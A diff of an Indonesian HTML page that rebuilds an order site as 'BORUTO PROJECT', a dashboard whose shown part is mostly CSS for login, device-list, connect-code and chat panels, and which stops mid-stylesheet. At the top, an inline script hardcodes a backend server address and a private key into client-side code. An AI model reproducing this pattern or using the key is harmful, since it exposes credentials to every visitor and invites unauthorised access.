@@ -1,71 +1,2488 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>NEBULA — Auto Order Account</title>
-  <link rel="stylesheet" href="style.css">
-  <script src="https://unpkg.com/lucide@latest"></script>
+  <!-- PRIVATE SERVER CONFIG: isi BORUTO_SERVER_BASE dan BORUTO_PRIVATE_KEY sebelum dipakai. -->
+  <script>
+    window.BORUTO_SERVER_BASE = window.BORUTO_SERVER_BASE || 'http://panelawetnode.mbgwowo.web.id:3512';
+    window.BORUTO_PRIVATE_KEY = window.BORUTO_PRIVATE_KEY || 'v0PAiInmhonMp3ZLdpZR9_4PQoBz7mipQV8-Na1m-t5K8AdR0fRM7XJhEFLRmsw2';
+  </script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>BORUTO PROJECT</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Space+Mono:wght@400;700&family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+:root{
+  --bg:#FFFFFF; --surface:#FFFFFF; --border:#000000;
+  --blue:#2563EB; --blueDark:#1E40AF; --blueDeep:#1E3A8A;
+  --gold:#FACC15; --goldLight:#FDE047; --goldDark:#EAB308;
+  --green:#22C55E; --amber:#F59E0B; --red:#EF4444;
+  --text:#000000; --textSub:#1F2937; --textDim:#6B7280;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{font-family:Inter,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;}
+#app{position:relative;width:100%;min-height:100vh;overflow-x:hidden;}
+.page{display:none;min-height:100vh;}
+.page.active{display:block;}
+.hidden{display:none !important;}
+
+.neo-field{background:var(--surface);border:3px solid var(--border);box-shadow:5px 5px 0 var(--border);display:flex;align-items:center;padding:0 18px;height:58px;transition:all .12s ease;}
+.neo-field.focused{border-color:var(--blue);box-shadow:5px 5px 0 var(--blue);}
+.neo-field.error{border-color:var(--red);box-shadow:5px 5px 0 var(--red);background:#FEF2F2;}
+.neo-field i{font-size:20px;margin-right:12px;color:var(--text);}
+.neo-field.focused i{color:var(--blue);}
+.neo-field.error i{color:var(--red);}
+.neo-field input{flex:1;border:0;outline:0;font-family:'Space Mono',monospace;font-size:14px;font-weight:700;color:var(--text);background:transparent;letter-spacing:.3px;}
+.neo-field input::placeholder{color:var(--textDim);}
+.toggle-pass{background:none;border:0;cursor:pointer;color:var(--text);font-size:18px;padding:4px;}
+
+.neo-btn{width:100%;height:58px;border:3px solid var(--border);background:var(--blue);color:#fff;font-family:Orbitron,sans-serif;font-size:16px;font-weight:900;letter-spacing:1.5px;box-shadow:6px 6px 0 var(--border);cursor:pointer;display:flex;align-items:center;justify-content:center;gap:12px;transition:all .12s;}
+.neo-btn:active{transform:translate(3px,3px);box-shadow:3px 3px 0 var(--border);}
+.neo-btn:disabled{background:#9CA3AF;cursor:not-allowed;}
+
+/* LANDING */
+.landing-page{background:var(--bg);min-height:100vh;padding:24px 20px;background-image:linear-gradient(rgba(0,0,0,.06) 1px,transparent 1px),linear-gradient(90deg,rgba(0,0,0,.06) 1px,transparent 1px);background-size:40px 40px;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;overflow:hidden;}
+.landing-glow{position:absolute;border-radius:50%;pointer-events:none;filter:blur(60px);}
+.landing-glow.top{top:-80px;left:-80px;width:280px;height:280px;background:rgba(37,99,235,.18);}
+.landing-glow.bottom{bottom:-100px;right:-100px;width:340px;height:340px;background:rgba(250,204,21,.18);}
+.landing-hero{position:relative;width:400px;height:220px;display:flex;align-items:center;justify-content:center;margin-bottom:24px;animation:floatHero 6s ease-in-out infinite;}
+@keyframes floatHero{0%,100%{transform:translateY(-5px);}50%{transform:translateY(5px);}}
+.landing-hero-ring-gold{position:absolute;width:390px;height:210px;border-radius:50%;border:4px solid var(--gold);}
+.landing-hero-ring-blue{position:absolute;width:340px;height:180px;border-radius:50%;border:4px solid var(--blue);}
+.landing-hero-core{position:relative;width:290px;height:160px;border:4px solid var(--border);background:var(--blue);box-shadow:10px 10px 0 var(--border);overflow:hidden;display:flex;align-items:center;justify-content:center;}
+.landing-hero-core img{width:100%;height:100%;object-fit:cover;display:block;}
+.landing-hero-core i{font-size:48px;color:var(--gold);text-shadow:2px 2px 0 var(--border);}
+.landing-title{font-family:Orbitron,sans-serif;font-size:44px;font-weight:900;letter-spacing:8px;color:var(--text);text-shadow:5px 5px 0 var(--gold);line-height:1;text-align:center;margin-bottom:8px;}
+.landing-subtitle{font-family:'Space Mono',monospace;font-size:12px;font-weight:700;letter-spacing:4px;color:var(--blue);text-align:center;margin-bottom:32px;}
+.landing-card{width:100%;max-width:400px;background:var(--surface);border:4px solid var(--border);box-shadow:8px 8px 0 var(--border);padding:22px 20px;}
+.landing-card .neo-btn{margin-bottom:14px;}
+.landing-buy-btn{width:100%;height:52px;background:var(--surface);color:var(--text);border:3px solid var(--border);box-shadow:5px 5px 0 var(--border);font-family:'Space Mono',monospace;font-size:14px;font-weight:900;letter-spacing:1.5px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:all .12s;}
+.landing-buy-btn:active{transform:translate(3px,3px);box-shadow:2px 2px 0 var(--border);}
+.landing-divider{height:2px;background:var(--border);margin:20px 10px;}
+.landing-socials{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.landing-social{height:50px;background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);display:flex;align-items:center;justify-content:center;gap:8px;font-family:'Space Mono',monospace;font-size:12px;font-weight:900;letter-spacing:1px;cursor:pointer;color:var(--text);transition:all .12s;}
+.landing-social:active{transform:translate(2px,2px);box-shadow:2px 2px 0 var(--border);}
+.landing-social.telegram i{color:#229ED9;}
+.landing-social.whatsapp i{color:#25D366;}
+.landing-footer{margin-top:28px;text-align:center;font-family:'Space Mono',monospace;font-size:10px;font-weight:700;letter-spacing:2px;color:var(--textDim);}
+
+/* LOGIN */
+.login-page{background:var(--bg);min-height:100vh;padding:24px 20px;background-image:linear-gradient(rgba(0,0,0,.06) 1px,transparent 1px),linear-gradient(90deg,rgba(0,0,0,.06) 1px,transparent 1px);background-size:40px 40px;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+.login-logo-wrap{position:relative;width:420px;height:260px;display:flex;align-items:center;justify-content:center;margin-bottom:24px;}
+.ring-gold{position:absolute;width:400px;height:225px;border-radius:50%;border:5px solid var(--gold);}
+.ring-blue{position:absolute;width:355px;height:200px;border-radius:50%;border:5px solid var(--blue);}
+.login-logo-core{position:relative;width:320px;height:210px;border:5px solid var(--border);background:var(--blue);box-shadow:10px 10px 0 var(--border);overflow:hidden;display:flex;align-items:center;justify-content:center;}
+.login-logo-core img{width:100%;height:100%;object-fit:cover;display:block;}
+.login-logo-core i{font-size:48px;color:var(--gold);text-shadow:2px 2px 0 var(--border);}
+.login-title{font-family:Orbitron,sans-serif;font-size:28px;font-weight:900;letter-spacing:2px;color:var(--text);text-shadow:3px 3px 0 var(--gold);margin-bottom:14px;text-align:center;}
+.login-badge{display:inline-block;padding:8px 18px;background:var(--gold);border:3px solid var(--border);color:var(--text);font-size:13px;font-weight:800;box-shadow:5px 5px 0 var(--border);margin-bottom:24px;font-family:'Space Mono',monospace;letter-spacing:.5px;}
+.login-card{width:100%;max-width:400px;background:var(--surface);border:4px solid var(--border);padding:26px 22px;box-shadow:8px 8px 0 var(--border);}
+.login-section-head{display:flex;align-items:center;gap:12px;margin-bottom:22px;}
+.login-section-head .bar{width:6px;height:24px;background:var(--gold);border:2px solid var(--border);}
+.login-section-head i{color:var(--blue);font-size:20px;}
+.login-section-head span{font-family:'Space Mono',monospace;font-size:13px;font-weight:900;letter-spacing:1px;text-transform:uppercase;color:var(--text);}
+.login-card .neo-field{margin-bottom:18px;}
+.login-footer{margin-top:26px;text-align:center;font-family:'Space Mono',monospace;}
+.login-footer .buy{font-size:13px;color:var(--textSub);margin-bottom:20px;font-weight:600;}
+.login-footer .buy a{color:var(--blue);font-weight:900;text-decoration:underline;}
+.brand-row{display:flex;align-items:center;justify-content:center;gap:10px;font-family:Orbitron,sans-serif;font-size:11px;font-weight:700;letter-spacing:1.8px;color:var(--text);}
+.dot{width:10px;height:10px;border:2px solid var(--border);}
+.dot.gold{background:var(--gold);}
+.dot.blue{background:var(--blue);}
+
+/* VIDEO */
+.vid-page{background:#000;width:100vw;height:100vh;height:100dvh;position:fixed;top:0;left:0;overflow:hidden;display:flex;flex-direction:column;}
+.vid-title-bar{position:absolute;top:0;left:0;padding:14px 16px;padding-right:120px;background:linear-gradient(180deg,rgba(0,0,0,.85) 0%,rgba(0,0,0,0) 100%);display:flex;align-items:center;gap:10px;z-index:10;pointer-events:none;}
+.vid-title-dot{width:10px;height:10px;border-radius:50%;background:var(--gold);box-shadow:0 0 12px var(--gold);animation:vidPulse 1.5s infinite;flex-shrink:0;}
+@keyframes vidPulse{0%,100%{opacity:1;}50%{opacity:.35;}}
+.vid-title-text{font-family:Orbitron,sans-serif;font-size:14px;font-weight:900;letter-spacing:4px;color:#FFF;text-shadow:2px 2px 0 var(--border),-1px -1px 0 var(--border);flex:1;}
+.vid-wrap{position:relative;flex:1;width:100%;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden;}
+.vid-wrap video{width:100%;height:100%;object-fit:cover;background:#000;display:block;}
+.vid-skip{position:absolute;top:16px;right:16px;z-index:20;display:flex;align-items:center;gap:6px;padding:8px 14px;background:rgba(0,0,0,.7);border:2px solid #FFF;color:#FFF;font-family:'Space Mono',monospace;font-size:11px;font-weight:900;letter-spacing:1.5px;cursor:pointer;box-shadow:3px 3px 0 var(--gold);transition:all .15s;}
+.vid-skip:hover{background:var(--gold);color:#000;border-color:var(--border);}
+.vid-skip:active{transform:translate(2px,2px);box-shadow:1px 1px 0 var(--gold);}
+.vid-skip i{font-size:12px;}
+.vid-bottom{position:absolute;bottom:0;left:0;right:0;padding:14px 16px 18px;background:linear-gradient(0deg,rgba(0,0,0,.9) 0%,rgba(0,0,0,0) 100%);z-index:10;}
+.vid-progress-bar{width:100%;height:8px;background:rgba(255,255,255,.2);border:2px solid #FFF;overflow:hidden;cursor:pointer;position:relative;margin-bottom:8px;}
+.vid-progress-fill{height:100%;width:0;background:var(--gold);transition:width .2s linear;box-shadow:0 0 12px var(--gold);}
+.vid-time-row{display:flex;justify-content:space-between;align-items:center;font-family:'Space Mono',monospace;font-size:10px;font-weight:900;color:#FFF;letter-spacing:1px;text-shadow:1px 1px 0 #000;}
+.vid-time-row .label{color:var(--gold);display:flex;align-items:center;gap:6px;}
+.vid-play-center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:80px;height:80px;border-radius:50%;background:rgba(0,0,0,.6);border:3px solid #FFF;display:none;align-items:center;justify-content:center;cursor:pointer;z-index:15;box-shadow:4px 4px 0 var(--gold);}
+.vid-play-center.show{display:flex;}
+.vid-play-center i{font-size:32px;color:#FFF;margin-left:5px;}
+
+/* DASHBOARD */
+.nbr-topbar{display:flex;align-items:center;gap:12px;padding:12px 16px;background:var(--surface);border-bottom:4px solid var(--border);position:sticky;top:0;z-index:50;}
+.nbr-topbar-logo{flex:1;background:var(--gold);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);padding:8px 16px;display:flex;align-items:center;justify-content:center;height:44px;margin-right:8px;}
+.nbr-logo-text{font-family:Orbitron,sans-serif;font-weight:900;letter-spacing:4px;color:var(--text);font-size:14px;}
+.nbr-logout-btn{height:44px;padding:0 14px;background:var(--gold);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);font-family:'Space Mono',monospace;font-weight:900;font-size:11px;cursor:pointer;display:flex;align-items:center;gap:6px;color:var(--text);letter-spacing:1px;}
+.nbr-logout-btn:active{transform:translate(2px,2px);box-shadow:2px 2px 0 var(--border);}
+.nbr-body{background:var(--bg);padding:16px;padding-bottom:30px;}
+.nbr-banner{background:var(--green);border:4px solid var(--border);box-shadow:6px 6px 0 var(--border);margin-bottom:20px;overflow:hidden;position:relative;height:260px;}
+.nbr-banner-inner{position:absolute;inset:0;background:linear-gradient(135deg,var(--blueDeep) 0%,var(--blue) 50%,var(--gold) 100%);display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;}
+.nbr-banner-inner::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,rgba(255,255,255,.05) 0,rgba(255,255,255,.05) 10px,transparent 10px,transparent 20px);}
+.nbr-banner-text{font-family:Orbitron,sans-serif;font-size:48px;font-weight:900;color:#FFF;text-shadow:-3px -3px 0 var(--border),3px -3px 0 var(--border),-3px 3px 0 var(--border),3px 3px 0 var(--border);letter-spacing:4px;line-height:1;z-index:2;transform:skewX(-8deg);}
+.nbr-banner-text2{font-family:Orbitron,sans-serif;font-size:48px;font-weight:900;color:var(--gold);text-shadow:-3px -3px 0 var(--border),3px -3px 0 var(--border),-3px 3px 0 var(--border),3px 3px 0 var(--border);letter-spacing:4px;line-height:1;z-index:2;transform:skewX(-8deg);margin-top:-8px;}
+.nbr-banner-decoration{position:absolute;top:10px;left:10px;font-size:14px;color:rgba(255,255,255,.6);z-index:2;letter-spacing:4px;}
+.nbr-profile-wrap{position:relative;margin-bottom:20px;}
+.nbr-profile-card{background:var(--surface);border:4px solid var(--border);box-shadow:6px 6px 0 var(--border);padding:18px;padding-right:50px;position:relative;margin-right:20px;}
+.nbr-profile-label{font-family:'Space Mono',monospace;font-size:10px;letter-spacing:2px;color:var(--textDim);margin-bottom:10px;font-weight:700;}
+.nbr-profile-row{display:flex;align-items:center;gap:14px;margin-bottom:18px;}
+.nbr-avatar{width:80px;height:80px;border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);background:var(--gold);flex-shrink:0;overflow:hidden;border-radius:50%;}
+.nbr-profile-info{flex:1;min-width:0;}
+.nbr-username{font-family:Orbitron,sans-serif;font-size:26px;font-weight:900;color:var(--text);letter-spacing:1px;line-height:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.nbr-role-badge{display:inline-block;background:var(--gold);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);padding:3px 10px;font-family:'Space Mono',monospace;font-size:10px;font-weight:900;letter-spacing:1.5px;color:var(--text);margin-top:8px;}
+.nbr-expired{display:inline-flex;align-items:center;gap:5px;border:2px solid var(--border);background:var(--surface);padding:3px 8px;font-family:'Space Mono',monospace;font-size:9px;font-weight:700;color:var(--text);margin-top:6px;margin-left:6px;}
+.nbr-arrow-btn{position:absolute;top:16px;right:60px;width:36px;height:36px;background:var(--surface);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);display:flex;align-items:center;justify-content:center;font-size:16px;color:var(--text);}
+.nbr-profile-stats{display:flex;align-items:center;border-top:2px solid var(--border);padding-top:14px;}
+.nbr-stat-item{flex:1;text-align:center;}
+.nbr-stat-val{font-family:Orbitron,sans-serif;font-size:26px;font-weight:900;color:var(--text);}
+.nbr-stat-label{font-family:'Space Mono',monospace;font-size:9px;letter-spacing:1.5px;color:var(--text);margin-top:2px;font-weight:700;}
+.nbr-stat-divider{width:2px;height:32px;background:var(--border);}
+.nbr-side-tab{position:absolute;top:0;right:0;bottom:0;width:38px;background:var(--surface);border:4px solid var(--border);box-shadow:6px 6px 0 var(--border);display:flex;align-items:center;justify-content:center;writing-mode:vertical-rl;text-orientation:mixed;transform:rotate(180deg);font-family:Orbitron,sans-serif;font-size:12px;font-weight:900;letter-spacing:3px;color:var(--text);padding:10px 0;}
+.nbr-section-title{font-family:Inter,sans-serif;font-size:16px;font-weight:700;color:var(--text);margin-bottom:12px;margin-left:4px;}
+.nbr-action-card{display:flex;align-items:center;gap:12px;background:var(--surface);border:4px solid var(--border);box-shadow:5px 5px 0 var(--border);padding:14px;margin-bottom:14px;cursor:pointer;}
+.nbr-action-card:active{transform:translate(3px,3px);box-shadow:2px 2px 0 var(--border);}
+.nbr-action-icon{width:52px;height:52px;background:var(--gold);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0;color:var(--text);}
+.nbr-action-icon.music{background:#A78BFA;color:#FFF;}
+.nbr-action-icon.tools{background:#22D3EE;color:var(--text);}
+.nbr-action-icon.admin{background:#F87171;color:#FFF;}
+.nbr-action-icon.key{background:var(--blue);color:#FFF;}
+.nbr-action-icon.chat{background:var(--green);color:#FFF;}
+.nbr-action-icon.connect{background:#0891B2;color:#FFF;}
+.nbr-action-info{flex:1;min-width:0;}
+.nbr-action-tag{font-family:'Space Mono',monospace;font-size:9px;font-weight:700;color:var(--textDim);letter-spacing:1.5px;margin-bottom:2px;}
+.nbr-action-title{font-family:Inter,sans-serif;font-size:17px;font-weight:800;color:var(--text);margin-bottom:2px;}
+.nbr-action-sub{font-family:'Space Mono',monospace;font-size:10px;color:var(--textDim);font-weight:600;}
+.nbr-action-btn{height:38px;padding:0 14px;background:var(--gold);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);font-family:'Space Mono',monospace;font-weight:900;font-size:11px;cursor:pointer;letter-spacing:1px;flex-shrink:0;color:var(--text);display:flex;align-items:center;gap:6px;}
+.nbr-action-btn:active{transform:translate(2px,2px);box-shadow:1px 1px 0 var(--border);}
+.nbr-action-btn .arrow-icon{transition:transform .3s;}
+.nbr-action-card.expanded .arrow-icon{transform:rotate(90deg);}
+
+/* DEVICE LIST */
+.device-list-wrap{max-height:0;overflow:hidden;transition:max-height .5s ease;}
+.device-list-wrap.open{max-height:5000px;}
+.device-list-inner{padding:14px;background:var(--surface);border:4px solid var(--border);border-top:0;box-shadow:5px 5px 0 var(--border);margin-bottom:14px;}
+.device-item{background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);margin-bottom:12px;overflow:hidden;}
+.device-item:last-child{margin-bottom:0;}
+.device-item-head{display:flex;align-items:center;gap:10px;padding:14px;cursor:pointer;}
+.device-item-head:active{background:#FEF9C3;}
+.device-item-icon{width:40px;height:40px;background:var(--gold);border:3px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;color:var(--text);}
+.device-item-name{font-family:Orbitron,sans-serif;font-size:15px;font-weight:900;color:var(--text);letter-spacing:.5px;flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.device-item-status{padding:3px 8px;border:2px solid var(--border);background:var(--green);color:#FFF;font-family:'Space Mono',monospace;font-size:9px;font-weight:900;letter-spacing:1px;flex-shrink:0;}
+.device-item-status.offline{background:var(--red);}
+.device-item-arrow{font-size:12px;color:var(--text);transition:transform .3s;flex-shrink:0;margin-left:4px;}
+.device-item.expanded .device-item-arrow{transform:rotate(180deg);}
+.device-item-info{padding:0 14px 14px;border-bottom:2px dashed var(--border);}
+.device-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.device-info-cell{display:flex;align-items:center;gap:8px;padding:8px 10px;border:2px solid var(--border);background:#FEFCE8;}
+.device-info-cell .ico{width:22px;height:22px;background:var(--gold);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:11px;color:var(--text);flex-shrink:0;}
+.device-info-cell .txt{flex:1;min-width:0;}
+.device-info-cell .lbl{font-family:'Space Mono',monospace;font-size:8px;font-weight:700;color:var(--textDim);letter-spacing:1px;}
+.device-info-cell .val{font-family:'Space Mono',monospace;font-size:12px;font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.device-features{max-height:0;overflow:hidden;transition:max-height .5s ease;background:#FFFBEB;}
+.device-item.expanded .device-features{max-height:3000px;}
+.device-features-inner{padding:14px;border-top:2px solid var(--border);}
+.feature-cat{margin-bottom:14px;}
+.feature-cat:last-child{margin-bottom:0;}
+.feature-cat-title{font-family:'Space Mono',monospace;font-size:9px;font-weight:900;color:var(--textDim);letter-spacing:2px;margin-bottom:8px;padding-left:2px;}
+.feature-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
+.feature-btn{display:flex;align-items:center;gap:8px;padding:10px;background:var(--surface);border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);cursor:pointer;font-family:'Space Mono',monospace;font-size:10px;font-weight:900;color:var(--text);text-align:left;letter-spacing:.5px;}
+.feature-btn:active{transform:translate(2px,2px);box-shadow:1px 1px 0 var(--border);}
+.feature-btn .f-icon{width:26px;height:26px;background:var(--gold);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:12px;color:var(--text);flex-shrink:0;}
+.feature-btn.danger .f-icon{background:var(--red);color:#FFF;}
+.feature-btn.danger{border-color:var(--red);box-shadow:3px 3px 0 var(--red);}
+.device-empty{text-align:center;padding:30px 20px;color:var(--textDim);font-family:'Space Mono',monospace;}
+.device-empty i{font-size:36px;color:#D1D5DB;margin-bottom:10px;display:block;}
+.device-empty p{font-size:11px;letter-spacing:2px;font-weight:700;}
+
+/* CONNECT */
+.connect-wrap{max-height:0;overflow:hidden;transition:max-height .5s ease;}
+.connect-wrap.open{max-height:1500px;}
+.connect-inner{padding:18px;background:var(--surface);border:4px solid var(--border);border-top:0;box-shadow:5px 5px 0 var(--border);margin-bottom:14px;}
+.connect-info{display:flex;align-items:center;gap:10px;padding:10px 12px;margin-bottom:14px;background:#EFF6FF;border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);}
+.connect-info i{color:var(--blue);font-size:16px;flex-shrink:0;}
+.connect-info-text{font-family:'Space Mono',monospace;font-size:10px;font-weight:700;color:var(--textSub);line-height:1.4;flex:1;}
+.connect-label{font-family:'Space Mono',monospace;font-size:10px;font-weight:900;color:var(--text);letter-spacing:1.5px;margin-bottom:8px;display:block;}
+.connect-label .req{color:var(--red);}
+.connect-code-input{display:flex;align-items:center;gap:10px;height:54px;padding:0 16px;background:var(--surface);border:3px solid var(--border);box-shadow:5px 5px 0 var(--border);transition:all .15s;margin-bottom:14px;}
+.connect-code-input.focused{border-color:var(--blue);box-shadow:5px 5px 0 var(--blue);}
+.connect-code-input.error{border-color:var(--red);box-shadow:5px 5px 0 var(--red);background:#FEF2F2;}
+.connect-code-input.success{border-color:var(--green);box-shadow:5px 5px 0 var(--green);background:#F0FDF4;}
+.connect-code-input i{color:var(--text);font-size:16px;flex-shrink:0;}
+.connect-code-input input{flex:1;border:0;outline:0;font-family:'Space Mono',monospace;font-size:13px;font-weight:700;color:var(--text);background:transparent;letter-spacing:1px;}
+.connect-submit{width:100%;height:52px;background:var(--blue);color:#FFF;border:3px solid var(--border);box-shadow:5px 5px 0 var(--border);font-family:Orbitron,sans-serif;font-size:14px;font-weight:900;letter-spacing:1.5px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;}
+.connect-submit:disabled{background:#9CA3AF;cursor:not-allowed;}
+.connect-status{display:none;align-items:center;gap:8px;padding:10px 12px;margin-top:14px;border:3px solid var(--border);box-shadow:3px 3px 0 var(--border);font-family:'Space Mono',monospace;font-size:11px;font-weight:800;}
+.connect-status.show{display:flex;}
+.connect-status.ok{background:#F0FDF4;border-color:var(--green);color:var(--green);}
+.connect-status.err{background:#FEF2F2;border-color:var(--red);color:var(--red);}
+.connect-example{margin-top:10px;padding:8px 10px;background:rgba(250,204,21,.15);border:2px dashed var(--border);font-family:'Space Mono',monospace;font-size:9px;font-weight:700;color:var(--textDim);display:flex;align-items:center;gap:8px;cursor:pointer;}
+.connect-example .code-text{flex:1;word-break:break-all;line-height:1.4;}
+.connect-example .code-text strong{color:var(--text);font-size:10px;}
+.connect-copy-btn{flex-shrink:0;padding:5px 9px;background:var(--gold);color:var(--text);border:2px solid var(--border);box-shadow:2px 2px 0 var(--border);font-family:'Space Mono',monospace;font-size:9px;font-weight:900;cursor:pointer;}
+
+/* CHAT */
+.chat-wrap{max-height:0;overflow:hidden;transition:max-height .5s ease;}
+.chat-wrap.open{max-height:3000px;}
+.chat-inner{padding:0;background:var(--surface);border:4px solid var(--border);border-top:0;box-shadow:5px 5px 0 var(--border);margin-bottom:14px;overflow:hidden;}
+.chat-status-bar{display:flex;align-items:center;gap:8px;padding:8px 14px;background:var(--surface);border-bottom:3px solid var(--border);}
+.chat-status-dot{width:10px;height:10px;border-radius:50%;border:2px solid var(--border);background:var(--textDim);flex-shrink:0;}
+.chat-status-dot.online{background:var(--green);}
+.chat-status-dot.connecting{background:var(--amber);}
+.chat-status-dot.offline{background:var(--red);}
+.chat-status-text{font-family:'Space Mono',monospace;font-size:10px;font-weight:900;color:var(--text);letter-spacing:1px;flex:1;}
+.chat-online-count{font-family:'Space Mono',monospace;font-size:10px;font-weight:900;padding:2px 8px;background:var(--blue);color:#FFF;border:2px solid var(--border);}
+.chat-messages{height:340px;overflow-y:auto;padding:12px;background:#F8FAFC;display:flex;flex-direction:column-reverse;gap:8px;}
+.chat-msg{display:flex;gap:8px;max-width:85%;}
+.chat-msg.me{margin-left:auto;flex-direction:row-reverse;}
+.chat-msg-avatar{width:34px;height:34px;flex-shrink:0;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:Orbitron,sans-serif;font-size:13px;font-weight:900;color:#FFF;border-radius:50%;}
+.chat-msg-body{flex:1;min-width:0;}
+.chat-msg-head{display:flex;align-items:center;gap:6px;margin-bottom:3px;flex-wrap:wrap;}
+.chat-msg.me .chat-msg-head{justify-content:flex-end;}
+.chat-msg-name{font-size:11px;font-weight:800;}
+.chat-msg-role{font-family:'Space Mono',monospace;font-size:8px;font-weight:900;padding:1px 5px;border:1px solid var(--border);color:#FFF;}
+.chat-msg-time{font-family:'Space Mono',monospace;font-size:9px;font-weight:700;color:var(--textDim);}
+.chat-msg-bubble{padding:8px 12px;background:var(--surface);border:2px solid var(--border);box-shadow:3px 3px 0 var(--border);font-size:13px;line-height:1.4;word-wrap:break-word;border-radius:12px;}
+.chat-msg.me .chat-msg-bubble{background:var(--blue);color:#FFF;}
+.chat-empty{text-align:center;padding:40px 20px;color:var(--textDim);}
+.chat-input-row{display:flex;align-items:center;gap:8px;padding:12px;background:var(--surface);border-top:3px solid var(--border);}
+.chat-input{flex:1;display:flex;align-items:center;gap:8px;height:46px;padding:0 14px;background:#F1F5F9;border:2px solid var(--border);box-shadow:3px 3px 0 var(--border);}
+.chat-input input{flex:1;border:0;outline:0;font-size:13px;font-weight:600;background:transparent;}
+.chat-send-btn{width:46px;height:46px;flex-shrink:0;background:var(--blue);color:#FFF;border:2px solid var(--border);box-shadow:3px 3px 0 var(--border);display:flex;align-items:center;justify-content:center;cursor:pointer;}
+.chat-send-btn:disabled{background:#9CA3AF;}
+.chat-users-row{display:flex;gap:6px;padding:10px 12px;overflow-x:auto;background:var(--surface);border-top:2px dashed var(--border);}
+.chat-user-pill{display:flex;align-items:center;gap:6px;padding:5px 10px 5px 5px;background:var(--surface);border:2px solid var(--border);box-shadow:2px 2px 0 var(--border);flex-shrink:0;}
+.chat-user-pill .pill-avatar{width:24px;height:24px;display:flex;align-items:center;justify-content:center;font-family:Orbitron,sans-serif;font-size:10px;font-weight:900;color:#FFF;border:1px solid var(--border);border-radius:50%;}
+.chat-user-pill .pill-name{font-size:10px;font-weight:800;}
+.chat-user-pill .pill-role{font-family:'Space Mono',monospace;font-size:7px;font-weight:900;padding:1px 4px;color:#FFF;border:1px solid var(--border);}
+
+
+
+/* PWD */
+.pwd-form-wrap{max-height:0;overflow:hidden;transition:max-height .5s ease;}
+.pwd-form-wrap.open{max-height:2500px;}
+.pwd-form-inner{padding:18px;background:var(--surface);border:4px solid var(--border);border-top:0;box-shadow:5px 5px 0 var(--border);margin-bottom:14px;}
+.pwd-info-card{display:flex;align-items:center;gap:12px;padding:12px 14px;margin-bottom:16px;background:var(--surface);border:3px solid var(--border);box-shadow:4px 4px 0 var(--border);}
+.pwd-info-card .pwd-info-icon{width:38px;height:38px;flex-shrink:0;background:var(--blue);border:3px solid var(--border);display:flex;align-items:center;justify-content:center;color:#FFF;font-size:16px;}
+.pwd-info-card .pwd-info-lbl{font-family:'Space Mono',monospace;font-size:9px;font-weight:700;color:var(--textDim);letter-spacing:1.5px;}
+.pwd-info-card .pwd-info-val{font-family:Orbitron,sans-serif;font-size:14px;font-weight:900;}
+.pwd-info-card .pwd-info-badge{padding:4px 10px;flex-shrink:0;background:var(--green);color:#FFF;border:2px solid var(--border);font-family:'Space Mono',monospace;font-size:9px;font-weight:900;}
+.pwd-section-head{display:flex;align-items:center;gap:10px;margin-bottom:6px;}
+.pwd-section-head .bar{width:5px;height:20px;background:var(--gold);border:2px solid var(--border);}
+.pwd-section-head .ttl{font-size:15px;font-weight:800;}
+.pwd-section-sub{font-family:'Space Mono',monospace;font-size:10px;color:var(--textDim);margin-bottom:20px;padding-left:15px;}
+.pwd-field{position:relative;margin-bottom:14px;}
+.pwd-field.match-ok .neo-field{border-color:var(--green);box-shadow:5px 5px 0 var(--green);}
+.pwd-field.match-bad .neo-field{border-color:var(--red);box-shadow:5px 5px 0 var(--red);background:#FEF2F2;}
+.pwd-field .match-badge{position:absolute;top:50%;right:56px;transform:translateY(-50%);font-size:16px;display:none;}
+.pwd-field .match-badge.ok{color:var(--green);display:block;}
+.pwd-field .match-badge.bad{color:var(--red);display:block;}
+.pwd-strength{display:none;align-items:center;gap:10px;margin:-6px 0 14px 0;}
+.pwd-strength.show{display:flex;}
+.pwd-strength .bar-wrap{flex:1;height:6px;background:#E5E7EB;border:2px solid var(--border);overflow:hidden;}
